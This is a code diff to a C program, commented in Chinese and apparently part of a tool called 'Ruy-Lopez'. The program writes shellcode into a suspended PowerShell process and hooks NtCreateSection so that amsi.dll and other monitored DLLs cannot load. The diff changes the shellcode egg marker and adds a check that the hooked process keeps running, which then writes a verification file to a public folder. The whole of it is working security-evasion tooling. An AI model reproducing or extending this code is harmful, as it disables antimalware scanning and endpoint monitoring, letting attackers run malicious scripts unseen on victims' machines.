@@ -58,7 +58,8 @@ pNtWriteVirtualMemory NtWriteVirtualMemory = NULL;
 pNtProtectVirtualMemory NtProtectVirtualMemory = NULL;
 
 // ===== Egg 标记（用于在 shellcode 中查找占位符）=====
-unsigned char EGG[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xC0, 0xDE };
+// 注意：这个 egg 必须与 HookShellcode.c 中 originalBytes() 函数定义的一致
+unsigned char EGG[] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x13, 0x37, 0xDE, 0xAD };
 #define EGG_SIZE 8
 
 /**
@@ -407,10 +408,56 @@ int main(int argc, char* argv[]) {
 
     printf("[+] Process resumed\n");
     printf("\n===================================================================\n");
-    printf("[+] DLL Blocking active! Press Enter to exit...\n");
-    printf("===================================================================\n");
+    printf("[+] DLL Blocking active!\n");
+    printf("===================================================================\n\n");
 
-    // 等待用户输入
+    // 等待5秒，检查进程状态
+    printf("[*] Waiting 5 seconds to verify process status...\n");
+    Sleep(5000);
+
+    // 检查进程是否仍在运行
+    DWORD exitCode = 0;
+    if (GetExitCodeProcess(pi.hProcess, &exitCode)) {
+        if (exitCode == STILL_ACTIVE) {
+            printf("[+] Target process still running - Hook installed!\n");
+
+            // 创建验证文件
+            HANDLE hMarker = CreateFileA(
+                "C:\\Users\\Public\\dll_blocking_verified.txt",
+                GENERIC_WRITE,
+                0,
+                NULL,
+                CREATE_ALWAYS,
+                FILE_ATTRIBUTE_NORMAL,
+                NULL
+            );
+
+            if (hMarker != INVALID_HANDLE_VALUE) {
+                char msg[512];
+                snprintf(msg, sizeof(msg),
+                    "Ruy-Lopez DLL Blocking Verified!\n"
+                    "Target Process: PowerShell (PID: %u)\n"
+                    "NtCreateSection Hook Address: 0x%p\n"
+                    "Shellcode Address: 0x%p\n"
+                    "Shellcode Size: %u bytes\n"
+                    "Hook Status: Installed successfully\n"
+                    "Technique: Hook NtCreateSection to block DLL loading\n"
+                    "Target DLLs: amsi.dll and other monitored DLLs\n",
+                    pi.dwProcessId,
+                    pNtCreateSection,
+                    remoteMemory,
+                    shellcodeSize);
+                DWORD written;
+                WriteFile(hMarker, msg, strlen(msg), &written, NULL);
+                CloseHandle(hMarker);
+                printf("[+] Verification file created: C:\\Users\\Public\\dll_blocking_verified.txt\n");
+            }
+        } else {
+            printf("[!] Target process exited (Exit code: %u)\n", exitCode);
+        }
+    }
+
+    printf("\n[*] Press Enter to exit...\n");
     getchar();
 
     // 清理
